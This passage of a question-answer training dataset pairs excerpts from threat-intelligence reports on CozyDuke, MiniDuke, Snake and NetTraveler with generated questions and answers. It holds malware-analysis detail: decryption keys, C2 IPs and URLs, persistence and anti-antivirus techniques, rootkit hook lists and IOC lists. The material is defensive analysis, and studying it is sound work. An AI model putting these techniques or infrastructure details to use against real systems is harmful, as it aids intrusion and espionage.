    "output": "The use of multiple domains in the Dimnie campaign aligns with common tactics employed by advanced persistent threats (APTs) to increase resilience and reduce the risk of being shut down. By spreading their command and control infrastructure across numerous domains, APTs can ensure that even if some domains are detected and blocked, others remain operational. This tactic makes it challenging for defenders to completely disrupt the malware's communication channels. For cybersecurity defenses, this implies the need for robust domain monitoring and blocking mechanisms, as well as continuous threat intelligence gathering to stay ahead of the attackers' domain rotation strategies. Implementing multi-layered security measures and leveraging machine learning algorithms to detect anomalous domain activity can also enhance the effectiveness of defense mechanisms against such sophisticated threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Office Monkeys dropper analysis\nThe droppers and spyware components often maintain fairly common characteristics 68271df868f462c06e24a896a9494225,Office Monkeys LOL Video.zip\nBelieve it or not, recipients in bulk run the file within: 95b3ec0a4e539efaa1faa3d4e25d51de,Office Monkeys (Short Flash Movie).exe\nThis file in turn drops two executables to %temp%\n2aabd78ef11926d7b562fd0d91e68ad3, Monkeys.exe\n3d3363598f87c78826c859077606e514, player.exe\nIt first launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise office with a human colleague. It then launches player.exe, a CozyDuke dropper maintaining anti-detection techniques:\n3d3363598f87c78826c859077606e514,338kb,player.exe,Trojan.Win32.CozyBear.v,CompiledOn:2014.07. 02 21:13:33\nThe file collects system information, and then invokes a WMI instance in the root\\securitycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here:\nSELECT * FROM AntiVirusProduct\nSELECT * FROM FireWallProduct\nThe code hunts for several security products to evade:\nCRYSTAL\nKASPERSKY\nSOPHOS\nDrWeb\nAVIRA\nCOMODO Dragon\nIn addition to the WMI/wql use, it also hunts through the\n\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\" registry key looking for security products to avoid.\nFollowing these checks, it drops several more malware files signed with the pasted AMD digital signature to a directory it creates. These files are stored within an 217kb encrypted cab file in the dropper's resources under the name \"A\". The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \\x36\\x11\\xdd\\x08\\xac\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32.\nThe cab file is decompressed and its contents are created on disk. These dropped files bundle functionality for both 64bit and 32bit Windows systems:\nC:\\Documents and Settings\\user\\Application Data\\ATI_Subsystem\\\n6761106f816313394a653db5172dc487,54kb,amdhcp32.dll  \u2190 32bit dll,CompiledOn:2014.07.02 21:13:24 d596827d48a3ff836545b3a999f2c3e3,60kb,aticaldd.dll  \u2190 64bit dll,CompiledOn:2014.07.02 21:13:26 bc626c8f11ed753f33ad1c0fe848d898,285kb,atiumdag.dll \u2190 32bit dll, 279kb, Trojan.Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26\n4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat\nThe code copies rundll32.exe from windows\\system32 to its newly created %appdata%\\ATI_Subsystem\nThe code copies rundll32.exe from windows\\system32 to its newly created %appdata%\\ATI_Subsystem subdirectory as \"amdocl_as32.exe\" alongside the three dll's listed above. It runs atiumdag.dll with two parameter values, it's only export and an arbitrary pid,  i.e.:\n\"C:\\Documents and Settings\\user\\Application Data\\ATI_Subsystem\\amdocl_as32.exe\" \"C:\\Documents and Settings\\user\\Application Data\\ATI_Subsystem\\atiumdag.dll\"\", ADL2_ApplicationProfiles_System_Reload 1684\"\nThis dll is built with anti-AV protections as well. However, it looks for a different but overlapping set, and the random duplication suggests that this component was cobbled together with its dropper, partly regionally based on target selection.\nKASPERSKY\nThe code collects information about the system efd5aba3-6719-4655-8a72-1aa93feefa38C:\\Documents and Settings\\user\\Application Data\\ATI_Subsystem\\amdocl_as32exeMyPCuserMicrosoft Windows XP 512600 SP 30 x32Admin192.60.11.1008:11:17:f2:9a:efSophos Anti-Virus\nFinally, this process beacons to www.sanjosemaristas.com, which appears to be a site that has been compromised and misused multiple times in the past couple of years. hxxp://www.sanjosemaristas.com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter's service name GUID. It uses standard Win32 base cryptography functions to generate a CALG_RC4 session key to encrypt the collected data communications and POSTs it to the server.\nBig Headline: Second stage malware and communications:\nThe attackers send commands and new modules to be executed to the victims through the C&Cs. The C&C scripts store these temporarily until the next victim connects in local files. We've identified two such files:\nsettings.db\nsdfg3d.db\nHere's how such a database file appears:\nThese are BASE64 encoded and use the same RC4 encryption key as the malware configuration.\nDecoding them resulted in the following payloads:\n59704bc8bedef32709ab1128734aa846 *ChromeUpdate.ex_\n5d8835982d8bfc8b047eb47322436c8a *cmd_task.dll\ne0b6f0d368c81a0fb197774d0072f759 *screenshot_task.dll\nDecoding them also resulted in a set of tasking files maintaining agent commands and parameter values: conf.xml\nAnd a set of \"reporting\" files, maintaining stolen system \"info\", error output, and \"AgentInfo\" output, from victim systems:\nDCOM_amdocl_ld_API_.raw\nUtil_amdave_System_.vol\nLast_amdpcom_Subsystem_.max\nData_amdmiracast_API_.aaf\n7.txt\nscreenshot_task.dll is a 32-bit dll used to take a screenshot of the full desktop window and save it as a bitmap in %temp%. The number of times the screenshot is repeated is configurable within the xml task file.\ncmd_task.dll is a 32-bit dll that maintains several primitives. It is used to create new processes, perform as a command line shell, and several other tasks.\nEach of these payloads is delivered together with a configuration file that explains how to run it, for instance:\nFurthermore, ChromeUpdate is a 64-bit executable (which appears to be a WEXTRACT package) that oddly drops a 32-bit Dll. Cache.dll is simply stored as a cabinet file in the ChromeUpdate's resource section.\nChromeUpdate.exe starts the file with \"rundll32 cache.dll,ADB_Setup\"\nBig Headline: Cache.dll code details\nStructurally, cache.dll is a fairly large backdoor at 425kb. It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn't exposed until runtime. No pdb/debug strings are present in the code.\nIt maintains eight exports, including DllMain:\nADB_Add\nADB_Cleanup\nADB_Initnj\nADB_Load\nADB_Release\nADB_Remove\nADB_Setup\nADB_Setup is a entry point that simply spawns another thread and waits for completion.\nAbove, we see a new thread created with the start address of Cache.dll export  \"ADB_Load\" by the initial thread.\nThis exported function is passed control while the initial thread runs a Windows message loop. It first grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data:\nThe standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key \"\\x8B\\xFF\\x55\\x8B\\xEC\\x83\\xEC\\x50\\xA1\\x84\\x18\\x03\\x68\\x33\\xC9\\x66\\xF7\\x45\\x10\\xE8\\x1F\\x89\\x45\\xF C\\x8B\\x45\\x14\\x56\".\nThe code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality:\nInternetCloseHandle\nInternetReadFile\nHttpSendRequestA\nHttpOpenRequestA\nHttpQueryInfoA\nInternetConnectA\nInternetCrackUrlA\nInternetOpenA\nInternetSetOptionW\nGetAdaptersInfo\nMuch like the prior office monkey \"atiumdag.dll\" component, this code collects identifying system information using standard win32 API calls:\nComputer name - GetComputerNameW\nUser name - GetUserNameW\nAdapter GUID, ip address, mac address - GetAdaptersInfo\nWindows version - GetVersionExW\nIt then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls.\nCache.dll connectback urls:\n209.200.83.43/ajax/links.php\n209.200.83.43/ajax/api.php\n209.200.83.43/ajax/index.php\n209.200.83.43/ajax/error.php\n209.200.83.43/ajax/profile.php\n209.200.83.43/ajax/online.php\n209.200.83.43/ajax/loader.php\n209.200.83.43/ajax/search.php\nObserved user-agent string on the wire, but it's dynamically generated based on the Windows system settings (retrieved using standard win32 api \"ObtainUserAgentString\"):\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)\"\n3.0.04506.648; .NET CLR 3.5.21022)\"\nBig Headline: Connections with MiniDuke/CosmicDuke/OnionDuke:\nOne of the second stage modules of Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke. Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38ff769. Both have exactly the same export tables and appear to be called internally \"UserCache.dll\":\nThis seems to indicate the authors of OnionDuke and Cozy Bear are the same, or working together.\nAnother interesting comparison of two other files matches a recent second stage tool from the CozyDuke attacks with a second stage component from other Miniduke/Onionduke attacks.\n2e0361fd73f60c76c69806205307ccac, update.dll (Miniduke), 425kb (internal name = \"UserCache.dll\") 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (Cozyduke), 425kb (internal name = \"UserCache.dll\")\nThe two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time. The table below presents the function matches based on size data, but the calls, jmps and code all match as well. The contents of only one of these exports in update.dll has no match whatsoever in cache.dll.\nUnlike the atiumdag.dll file above, however, cache.dll and update.dll do not maintain anti-AV and anti-analysis functionality sets. Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality.\nWe expect ongoing and further activity from this group in the near future and variations on the malware used in previous duke-ish incidents.\nFor more information about MiniDuke, CosmicDuke and OnionDuke, please see References.\n\nQ: How does the CozyDuke APT ensure the persistence of its malicious activities on a compromised system, and what specific techniques are employed to achieve this?",
    "output": "A: The CozyDuke APT ensures persistence by copying rundll32.exe from the system32 directory to a newly created subdirectory under %appdata% named ATI_Subsystem. It renames rundll32.exe to amdocl_as32.exe and places it alongside three DLLs: amdhcp32.dll, aticaldd.dll, and atiumdag.dll. The malware then runs atiumdag.dll with specific parameters to maintain its presence on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 2014: MiniDuke's rise from the ashes\nWhile MiniDuke activity decreased significantly during the rest of 2013 following the attention it garnered from researchers, the beginning of 2014 saw the toolset back in full force. All MiniDuke components, from the loader and downloader to the backdoor, had been slightly updated and modified during the downtime. Interestingly, the nature of these modifications suggests that their primary purpose was to regain the element of stealth and undetectability that had been lost almost a year earlier.\nOf these modifications, arguably the most important were the ones done to the loader. These resulted in a loader version that would later become known as the \"Nemesis Gemina loader\" due to PDB strings found in many of the samples. It is however still only an iteration on earlier versions of the MiniDuke loader.\nThe first observed samples of the Nemesis Gemina loader (compiled on 14th December 2013) were used to load the updated MiniDuke backdoor, but by the spring of 2014 the Nemesis Gemina loader was also observed in use with CosmicDuke.\n2014: CosmicDuke's moment of fame and the scramble that ensued\nFollowing the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2nd July 2014 . The next day, Kaspersky also published their own research on the malware. It should be noted that until this point, even though CosmicDuke had been in active use for over 4 years, and had undergone minor modifications and updates during that time, even the most recent CosmicDuke samples would often embed persistence components that date back to 2012. These samples would also contain artefacts of functionality from the earliest CosmicDuke samples from 2010.\nIt is therefore valuable to observe how the Dukes reacted to CosmicDuke's outing at the beginning of July. By the end of that month, CosmicDuke samples we found that had been compiled on the 30th of July had shed unused parts of their code that had essentially just been relics of the past. Similarly, some of the hardcoded values that had remained unaltered in CosmicDuke samples for many years had been changed. We believe these edits were an attempt at evading detection by modifying or removing parts of the toolset that the authors believed might be helpful in identifying and detecting it.\nConcurrently with the alterations to CosmicDuke, the Dukes were also hard at work modifying their trusted loader. Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the first known samples from 2010. Again, much of the modification work focused on removing redundant code in an attempt to appear different from earlier versions of the loader. Interestingly however, another apparent evasion trick was also attempted -  forging of the loaders' compilation timestamps.\nIMAGE 6: COZYDUKE DECOYS\nLeft - US letter fax test decoy used  in CozyDuke campaigns\nRight - Screenshot of the monkey video decoy also used by CozyDuke\nThe first CosmicDuke sample we observed after the initial research on CosmicDuke was a sample compiled on the 30th of July 2014. The loader used by the sample purported to have been compiled on the 25th of March 2010. Due to artefacts left in the loader during compilation time however, we know that it used a specific version of the Boost library, 1.54.0, that was only published on the 1st of July 2013. The compilation timestamp therefore had to have been faked. F-Secure's whitepaperon CosmicDuke includes a timeline of the loader's usage, based on compilation timestamps. Perhaps the Dukes group thought that by faking a timestamp from before the earliest one cited in the whitepaper, they might be able to confuse researchers.\nDuring the rest of 2014 and the spring of 2015, the Dukes continued making similar evasion-focused modifications to CosmicDuke, as well as experimenting with ways to obfuscate the loader. In the latter case however, the group appear to have also simultaneously developed an entirely new loader, which we first observed being used in conjunction with CosmicDuke during the spring of 2015.\nWhile it is not surprising that the Dukes reacted to multiple companies publishing extensive reports on one of their key toolsets, it is valuable to note the manner in which they responded. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. Instead, they opted for minimal downtime and attempted to continue operations, with only minor modifications to the toolset.\n2014: CozyDuke and monkey videos\nWhile we now know that CozyDuke had been under development since at least the end of 2011, it was not until the early days of July 2014 that the first large-scale CozyDuke campaign that we are aware of took place. This campaign, like later CozyDuke campaigns, began with spear-phishing emails that tried to impersonate commonly seen spam emails. These spear-phishing emails would contain links that eventually lead the victim to becoming infected with CozyDuke.\nSome of the CozyDuke spear-phishing emails from early July posed as e-fax arrival notifications, a popular theme for spam emails, and used the same \"US letter fax test page\" decoy document that was used a year later by CloudDuke. In at least one case however, the email instead contained a link to a zip-archive file named \"Office Monkeys LOL Video.zip\", which was hosted on the DropBox cloud storage service. What made this particular case interesting was that instead of the usual dull PDF file, the decoy was a Flash video file, more specifically a Super Bowl advertisement from 2007 purporting to show monkeys at an office (image 6, above).\n2014: OnionDuke gets caught using a malicious Tor node\nOn the 23rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found. They noted that this node appeared to be maliciously modifying any executables that were downloaded through it over a HTTP connection. Executing the modified applications obtained this way would result in the victim being infected with unidentified malware. On the 14th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke, the other Duke toolsets known at the time .\nBased on our investigations into OnionDuke, we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identified by the researchers was being used to wrap executables on-the-fly with OnionDuke ((<>)image (<>)7, page 13). This is similar to the way in which the toolset was being spread via trojanized applications in torrent files during the summer of 2013.\nWhile investigating the OnionDuke variant being spread by the malicious Tor node, we also identified another OnionDuke variant that appeared to have successfully compromised multiple victims in the ministry of foreign affairs of an Eastern European country during the spring of 2014. This variant differed significantly in functionality from the one being spread via the Tor node, further suggesting that different OnionDuke variants are intended for different kinds of victims.\nWe believe that, unusually, the purpose of the OnionDuke variant spread via the Tor node was not to pursue targeted attacks but instead to form a small botnet for later use. This OnionDuke variant is related to the one seen during the summer of 2013 being spread via torrent files. Both of these infection vectors are highly indiscriminate and untargeted when compared to spear-phishing, the usual infection vector of choice for the Dukes.\nFurther, the functionality of the OnionDuke variant is derived from a number of modules. While one of these modules gathers system information and another attempts to steal the victim's usernames and passwords, as one would expect from a malware used for a targeted attack, the other two known OnionDuke modules are quite the opposite; one is designed for use in DoS attacks and the other for posting predetermined messages to the Russian VKontakte social media site. This sort of functionality is more common in criminality-oriented botnets, not state-sponsored targeted attacks.\nWe have since been able to identify at least two separate OnionDuke botnets. We believe the formation of the first of these botnets began in January 2014, using both unidentified infection vectors and the known malicious Tor node, and continued until our blogpost was published in November. We believe the formation of the second botnet began in August 2014 and continued until January 2015. We have been unable to identify the infection vectors used for this second botnet, but the C&C servers it used had open directory listings, allowing us to retrieve files containing listings of victim IP addresses. The geographic distribution of these IP addresses ((<>)image 8, (<>)page 13) further supports our theory that the purpose of this OnionDuke variant was not targeted attacks against high-profile targets.\nOne theory is that the botnets were a criminal side business for the Dukes group. The size of the botnet however (about 1400 bots) is very small if its intended use is for commercial DoS attacks or spam-sending. Alternatively, OnionDuke also steals user credentials from its victims, providing another potential revenue source. The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets.\nAnswer this question: How did the Dukes modify the MiniDuke loader in 2014, and what was the significance of these modifications?",
    "output": "The Dukes modified the MiniDuke loader in 2014 to regain the element of stealth and undetectability that had been lost almost a year earlier. The most significant modification was the creation of the 'Nemesis Gemina loader,' which was an iteration on earlier versions of the MiniDuke loader. This loader was initially used to load the updated MiniDuke backdoor but was later observed in use with CosmicDuke by the spring of 2014. These modifications were crucial for the Dukes to continue their operations without being easily detected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: OVERVIEW\nOne of the questions which comes up in the months after big security whitepaper disclosures is: where are they now? In other words, what happened to the operators, tools, and infrastructure which was revealed in the reports, blog-posts, and press interviews.\nDid they continue on as before, did they re-build the disclosed infrastructure and tools, did they go away and get jobs in another line of work?\nIn some cases, the disclosure had little, if any impact on the operation. For example, after the McAfee ShadyRAT report in 2011, there was absolutely no change in the attacks from the group behind this. However, when Mandiant released their APT1 report in 2013, there was a noticeable reduction in activity from the group \u2013 and much of the tools and infrastructure has not been seen since.\nIn the September 2010 issue of Foreign Affairs magazine1 , former US Deputy Secretary of Defense William J. Lynn discussed a cyber-attack which happened two years previously on the DoD's classified computer networks. Lynn described how a foreign intelligence agency planted malicious code on the networks with the aim of transferring data to servers under their control.\nThe article included the now oft-quoted phrase 'digital beachhead' to describe what was undoubtedly a significant compromise of US military systems. Further reports in the press2 kept the story alive in 2011, but since then this threat has received remarkably little attention.\nHowever, the operation behind the attacks has continued with little modification to the tools and techniques, in spite of the widespread attention a few years ago. They use highly sophisticated malware tools to maintain persistent access to their targets. These tools can be used for covert communications in a number of different modes, some of which present significant challenges for traditional security technologies to detect.\nThere are some threats which come and go, whilst there are others which are permanent features of the landscape. In this paper, we describe the tools and techniques of one of the most sophisticated and persistent threats we track. We hope this will help victims identify intrusions and understand their need to improve defences. Cyber security is a collaborative effort \u2013 the operation described in this paper again raises the bar for the security community in their efforts to keep up with the attackers in cyber-space\n1 (<http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain>)http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain\n2 (<http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617>)http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617\nBig Headline: SNAKE SAMPLES\nIn total we have collected over 100 unique files related to this espionage toolkit. Many of these were submitted to online malware analysis websites by victims and investigators over several years. In many cases the source country information of the submission is available. These allow us to visualise the distribution of countries where this malware has been seen:\nWhilst this view is likely to only be the tip of the iceberg, it does give us an initial insight into the profile of targets for the Snake operations.\nOther useful visualisations of the operations come from the compile timestamps. Below is shown a table with a count of the number of files in our sample set from recent years. Two samples compiled in late January 2014 show that this activity is ongoing.\nPlotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber-attacks. The creators of the malware operate a working week, just like any other professional. The single sample in our set which was compiled on a Saturday is an outlier, but doesn't alter the conclusion. Similarly, plotting the hour of the day in which the samples were compiled reveals another human pattern \u2013 the working day. This has been adjusted to UTC+4 to show a possible fit to the operators' local time.\n#Samples compiled per day of the week\n#Samples compiled by hour of the day (adjusted to UTC+4)\nBig Headline: USERMODE-CENTRIC ARCHITECTURE\nThe usermode-centric architecture of Snake is known to have been used from 2011 till 2014, with the most recent sample compiled on January 28, 2014.\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that module for the communications.\nOne of the analysed samples exposed multiple debug messages and source control check-in logs. It is not clear why those messages were allowed in the deployed driver - possibly an operational security lapse. However, they give some insight into the internal structure of the source code.\nFor example, the analysed driver gave away the following source file names:\n\u2022 d:\\proj\\cn\\fa64\\common\\loadlib\\common/loadlib_helpers.c\n\u2022 d:\\proj\\cn\\fa64\\common\\loadlib\\win/loadlib.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libunhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\ntsystem/libhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/hook_helpers.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/idthook.c\n\u2022 .\\rk_ntsystem.c\n\u2022 ..\\common\\helpers\\interface_s.c\n\u2022 ..\\k2\\fa_registry.c\n\u2022 ..\\k2\\syshook.c\nThe source control check-in log examples, showing the names of the developers to be 'vlad' and 'gilg':\n\u2022 $Id: snake_config.c 5204 2007-01-04 10:28:19Z vlad $\n\u2022 $Id: mime64.c 12892 2010-06-24 14:31:59Z vlad $\n\u2022 $Id: event.c 14097 2010-11-01 14:46:27Z gilg $\n\u2022 $Id: named_mutex.c 15594 2011-03-18 08:04:09Z gilg $\n\u2022 $Id: nt.c 20719 2012-12-05 12:31:20Z gilg $\n\u2022 $Id: ntsystem.c 19662 2012-07-09 13:17:17Z gilg $\n\u2022 $Id: rw_lock.c 14516 2010-11-29 12:27:33Z gilg $\n\u2022 $Id: rk_bpf.c 14518 2010-11-29 12:28:30Z gilg $\n\u2022 $Id: t_status.c 14478 2010-11-27 12:41:22Z gilg $\nIt also exposed the project name of this particular variant as 'sengoku':\nd:\\proj\\cn\\fa64\\sengoku\\_bin\\sengoku\\win32_debug\\sengoku_Win32.pdb\nNow it's time to execute the driver and see what it does.\nBig Headline: ROOTKIT EXECUTION\nWhen first executed, the driver creates device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32.  This device is used for userland/kernel communications.\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with  XOR 0xAA applied on top of it, so the driver decrypts it first.\nDepending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll.\nThe purpose of this DLL is to be injected into the user-mode processes. Some variants of Snake carry the DLL modules that can be installed as a service, to be run within taskhost.exe or services.exe processes.\nNext, the driver sets up the hooks for the following kernel-mode APIs:\n\u2022 ZwCreateThread\n\u2022 ZwCreateUserProcess\n\u2022 ZwShutdownSystem\nAfter that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started.\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect any newly created processes, and restore its driver file in case it gets deleted.\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n\u2022 ZwQuerySystemInformation\n\u2022 ZwQueryInformationProcess\n\u2022 ZwClose\n\u2022 ZwTerminateProcess\nThe driver then watches for all userland processes to see if they load any web pages.\nAs long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web servers.\nHowever, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module into the process that initiated connection (the browser).\nOnce injected, the module initiates polling from one of the hard-coded C&C servers.\nThe purpose of this behaviour is to blend Snake's traffic with the browser traffic, bypassing the firewalls, and keeping a low profile at the same time. By communicating from within a process that also communicates, even a technically savvy user will find it challenging to detect Snake traffic among legitimate traffic.\nThe reason behind such difficulty is because modern web pages often fetch pages from the different web servers, including such data as additional scripts, CSS templates, advertising contents, analytics data, blogs, social networking data, etc. When intercepted with the purpose of analysis, such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular website, such as a news website is open.\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed.\nIn order to test Snake's communications with the C&C servers, and still being able to clearly distinguish its traffic, a small tool was built to generate GET request to a web server running on the analysed system.\nThe tool was named as chrome.exe in order to trigger the malware communications.\n\nBased on the above text, answer a question. What insights can be gained from the compile timestamps and patterns of the Snake malware samples, and how do these patterns reflect the behavior of the malware operators?",
    "output": "The compile timestamps of the Snake malware samples reveal that the malware activity is ongoing, with samples compiled as recently as January 2014. Plotting the day of the week and hour of the day in which the samples were compiled shows a familiar pattern for modern cyber-attacks: the creators of the malware operate during a standard working week and working day. This suggests that the operators follow a professional schedule, similar to legitimate software development teams. Adjusting the timestamps to UTC+4 indicates a possible fit to the operators' local time zone, providing clues about their geographical location and working habits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: t yPes oF iocs:\nnetwork traffic / iPs\n> 209.11.241.144 - mothership, VPn server, c2\n> 121.12.124.69 - c2 (allen.w223. west263.cn)\n> 61.178.77.111 - c2 (wolf0.3322.org)\n> 182.50.130.68 - c2 (viprambler.com)\n> 103.20.192.59 - c2 (sunshine.59.ydli.net)\n> 213.156.6.122 - c2 (cultureacess.com)\n> 209.130.115.38 - c2 (tsgoogoo.net)\n> 98.143.145.80 - c2 (spit113.minidns. net)\n> 96.46.4.237 - c2 (sghrhd.190.20081. info)\n> 109.169.86.178 - c2 (imapupdate.com)\n> 125.67.89.156 - c2 (faceboak.net)\n> 142.4.96.6 - c2 (buynewes.com)\n> 124.115.21.209 - c2 iP\n> 67.198.140.148 - c2 (southstock.net)\n> 96.44.179.26 - c2 (vip222idc. s169.288idc.com)\n> 235.22.123.90 - c2 (gami1.com)\n> 178.77.45.32 - c2 (ra1nru.com)\ncommand and control domains and server names:\n> allen.w223.west263.cn\n> andriodphone.net\n> bauer.8866.org\n> buynewes.com\n> cultureacess.com\n> discoverypeace.org\n> drag2008.com\n> eaglesey.com\n> enterairment.net\n> faceboak.net\n> gami1.com\n> globalmailru.com\n> hint09.9966.org\n> imapupdate.com\n> inwpvpn.com\n> keyboardhk.com\n> localgroupnet.com\n> mailyandexru.com\n> msnnewes.com\n> newesyahoo.com\n> newfax.net\n> pkspring.net - sinkholed by Kaspersky lab\n> ra1nru.com\n> ramb1er.com\n> sghrhd.190.20081.info\n> southstock.net\n> spit113.minidns.net\n> tsgoogoo.net\n> vip222idc.s169.288idc.com\n> viplenta.com\n> vipmailru.com\n> viprainru.com\n> viprambler.com\n> vipyandex.com\n> vpnwork.3322.org\n> wolf0.3322.org\n> wolf001.us109.eoidc.net\n> yahooair.com\n> yangdex.org - sinkholed by Kaspersky lab\n> zeroicelee.com\nmalware file names on disk:\n> main active group(s) in 2013, unique configuration filenames: perf2012. ini, config_t.dat, config_shenghai.dat, pert2012.ini, in:\n\u2022 c:\\documents and settings\\[user]\\ local settings\\temp\\\n\u2022 c:\\users\\[user]\\local settings\\temp\\\n\u2022 c:\\WindoWs\\temp\\\n\u2022 c:\\WindoWs\\system\\\n> other (older) variants, configs: FmiFen.ini in:\n\u2022 %system%\n> malware body: net.exe, netmgr.exe, net mgr.dll in\n\u2022 c:\\\n\u2022 c:\\WindoWs\\system\\\n\u2022 %system%\n\u2022 %temp%\n\u2022 c:\\WindoWs\\temp\\\n\u2022 %appdata%\\Adobe\\\n> other (older) variants, malware bodies:\n\u2022 %system%\\bootuid.dll\n\u2022 %system%\\wuaucit.exe\n\u2022 %system%\\6to4ex.dll\n\u2022 %temp%\\Process.dll\n\u2022 %temp%\\Process.dll_d\n\u2022 %temp%\\cmss.exe\n\u2022 %temp%\\sysinfo2012.dll\n\u2022 %temp%\\winlogin.exe\n\u2022 %windir%\\system32\\iasex.dll\n\u2022 %windir%\\system32\\system_t.dll\n\u2022 %temp%\\smcs.exe\n\u2022 %appdata%\\Adobe\\sysinfo2012.dll\n> Artifacts during installation and running:\n\u2022 %temp%\\Win32en.bat\n\u2022 %system%\\dnlist.ini\n\u2022 %temp%\\dnlist.ini\n\u2022 %appdata%\\Adobe\\ie.log\n\u2022 %temp%\\ie.log\n\u2022 %system%\\enumfs.ini\n\u2022 %temp%\\enumfs.ini\n\u2022 %system%\\install.tmp\n\u2022 %system%\\kyrecord.txt\n\u2022 c:\\documents and settings\\<user>\\ start menu\\Programs\\startup\\seru-vice.lnk\n\u2022 c:\\documents and settings\\<user>\\ start menu\\Programs\\startup\\net-mgr.lnk\n\u2022 c :\\ d o c u m e~1\\<us e r > ~1\\ l o cAls~1\\temp\\recycler_w\\Allindex. ini\n\u2022 c :\\ d o c u m e~1\\<us e r > ~1\\ l o cAls~1\\temp\\recycler_w\\Allindex. ini_d\nmutexes created during backdoor operation:\n> boat-12 is running!\n> dochunter2012 is running!\n> hunter-2012 is running!\n> nt-2012 is running!\n> nettravler is running!\n> nettravler2012 is running!\n> sh-2011 is running!\n> shenghai is running!\nMedium Headline: 5.2 malware names by KasPersKy Products\ndetection names for the malware modules and related files:\n> backdoor.Win32.bifrose.bcx\n> trojan-dropper.Win32.dorifel.acrn\n> trojan-dropper.Win32.dorifel.acsj\n> trojan-dropper.Win32.dorifel.acsm\n> trojan-dropper.Win32.dorifel.acuf\n> trojan-dropper.Win32.dorifel.cql\n> trojan-dropper.Win32.dorifel.fhg\n> trojan-dropper.Win32.dorifel.fny\n> trojan-dropper.Win32.dorifel.iat\n> trojan-dropper.Win32.dorifel.jam\n> trojan-dropper.Win32.dorifel.kcy\n> trojan-dropper.Win32.dorifel.ylt\n> trojan-spy.Win32.travnet.*\n> trojan.multi.yahg.a\n> trojan.Win32.Agent2.eakj\n> trojan.Win32.Agent2.exms\n> trojan.Win32.Agent2.ezgb\n> trojan.Win32.Agent2.fdhs\n> trojan.Win32.delf.dgmw\n> trojan.Win32.delf.dgmx\n> trojan.Win32.Genome.agyil\n> trojan.Win32.Genome.aiunu\n> trojan.Win32.Genome.ajeqr\n> trojan.Win32.Genome.akqco\n> trojan.Win32.Genome.aksho\n> trojan.Win32.Jorik.travnet.*\n> not-a-virus:downloader.Win32.nettrav eler.*\nKaspersky detection names for malicious documents with embedded exploits used in spear-phishing attacks:\n> exploit.msWord.cVe-2010-3333.cg\n> exploit.msWord.cVe-2010-3333.ci\n> exploit.msWord.cVe-2010-3333.cl\n> exploit.Win32.cVe-2012-0158.y\n> exploit.msWord.cVe-2012-0158.an\n> 